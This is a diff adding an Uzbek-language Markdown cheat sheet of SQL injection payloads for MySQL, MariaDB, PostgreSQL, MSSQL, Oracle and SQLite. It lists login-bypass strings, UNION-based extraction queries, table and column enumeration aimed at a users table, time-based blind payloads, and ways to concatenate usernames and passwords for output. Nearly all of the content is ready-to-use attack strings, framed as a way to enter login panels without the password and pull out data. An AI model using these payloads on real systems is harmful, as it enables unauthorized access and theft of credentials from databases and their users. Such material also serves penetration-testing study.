@@ -1,0 +1,170 @@
+## 1. Tizim versiyasini aniqlash (Version Detection)
+
+Hujumni boshlashdan oldin orqa fonda qaysi ma'lumotlar bazasi turganini bilish uchun ishlatiladi:
+
+| Ma'lumotlar bazasi | Payload / Buyruq |
+| --- | --- |
+| **MySQL / MariaDB** | `SELECT @@version` yoki `SELECT version()` |
+| **PostgreSQL** | `SELECT version()` |
+| **Microsoft SQL Server (MSSQL)** | `SELECT @@version` |
+| **Oracle** | `SELECT banner FROM v$version` yoki `SELECT version FROM v$instance` |
+| **SQLite** | `SELECT sqlite_version()` |
+
+---
+
+## 2. Autentifikatsiyani aylanib o'tish (Auth Bypass)
+
+Login panellarda parolni bilmasdan kirib ketish uchun **User** maydoniga kiritiladigan klassik kombinatsiyalar:
+
+* **MySQL / MariaDB / SQLite:**
+* `' OR 1=1 -- -`
+* `' OR 1=1 #`
+* `admin' -- -`
+* `admin' #`
+
+
+* **PostgreSQL / MSSQL:**
+* `' OR 1=1 --`
+* `admin' --`
+
+
+* **Oracle:**
+* `' OR 1=1--`
+
+
+
+---
+
+## 3. Sharh belgilari (Comment Characters)
+
+So'rovning qolgan qismini o'chirib (sharhga aylantirib) yuborish uchun ishlatiladigan belgilar:
+
+* **MySQL:** `-- -` (chiziqchalardan keyin bo'sh joy majburiy), `#` yoki `/*`
+* **MariaDB:** `-- -` yoki `#`
+* **PostgreSQL:** `--` yoki `/*`
+* **MSSQL:** `--` yoki `/*`
+* **Oracle:** `--`
+* **SQLite:** `--`
+
+---
+
+## 4. Union Based Injection (Ma'lumotlarni tortib olish)
+
+Bunda ustunlar soni va ularning turi mos kelishi shart. Ustunlar sonini aniqlash uchun dastlab `ORDER BY` ishlatiladi (masalan: `' ORDER BY 1-- -`, `' ORDER BY 2-- -` toki xatolik berguncha).
+
+### Ustunlar soni aniqlangandan keyin (Misol tariqasida 3 ta ustun uchun):
+
+* **MySQL / MariaDB / PostgreSQL / MSSQL / SQLite:**
+```sql
+' UNION SELECT 1, 2, 3 -- -
+
+```
+
+
+* **Oracle (Oracle-da `FROM` qismi majburiy, shuning uchun dual jadvalidan foydalaniladi):**
+```sql
+' UNION SELECT 1, 2, 3 FROM dual--
+
+```
+
+
+
+---
+
+## 5. Tizim ma'lumotlarini yig'ish (Database & User Enumeration)
+
+Mavjud jadvallar va foydalanuvchilarni ko'rish:
+
+### Jadvallar nomini aniqlash (Table Names)
+
+* **MySQL / MariaDB / PostgreSQL / MSSQL:**
+```sql
+' UNION SELECT null, table_name, null FROM information_schema.tables -- -
+
+```
+
+
+* **Oracle:**
+```sql
+' UNION SELECT null, table_name FROM all_tables--
+
+```
+
+
+* **SQLite:**
+```sql
+' UNION SELECT null, tbl_name, null FROM sqlite_master WHERE type='table' -- -
+
+```
+
+
+
+### Ustunlar nomini aniqlash (Column Names)
+
+* **MySQL / MariaDB / PostgreSQL / MSSQL:**
+```sql
+' UNION SELECT null, column_name, null FROM information_schema.columns WHERE table_name='users' -- -
+
+```
+
+
+* **Oracle:**
+```sql
+' UNION SELECT null, column_name FROM all_tab_columns WHERE table_name='USERS'--
+
+```
+
+
+
+---
+
+## 6. Blind SQL Injection (Vaqtga asoslangan — Time-Based)
+
+Agar sahifada hech qanday xatolik yoki ma'lumot aks etmasa, bazani ma'lum bir soniya uxlashga majbur qilish orqali zaiflik tekshiriladi:
+
+* **MySQL / MariaDB:**
+```sql
+' AND SLEEP(5) -- -
+
+```
+
+
+* **PostgreSQL:**
+```sql
+' AND pg_sleep(5) --
+
+```
+
+
+* **MSSQL:**
+```sql
+' WAITFOR DELAY '0:0:5' --
+
+```
+
+
+* **Oracle:**
+```sql
+' AND 1=dbms_pipe.receive_message('a',5)--
+
+```
+
+
+* **SQLite (O'rnatilgan sleep funksiyasi yo'q, og'ir so'rov orqali vaqt cho'ziladi):**
+```sql
+' AND RANDOMBLOB(500000000) -- -
+
+```
+
+
+
+---
+
+## 7. Satrlarni birlashtirish (String Concatenation)
+
+Ma'lumotlarni bitta ustunda jamlab chiqarish uchun (masalan, login va parolni birga ko'rish):
+
+* **MySQL / MariaDB:** `CONCAT(username, ':', password)`
+* **PostgreSQL / Oracle / SQLite:** `username || ':' || password`
+* **MSSQL:** `username + ':' + password`
+
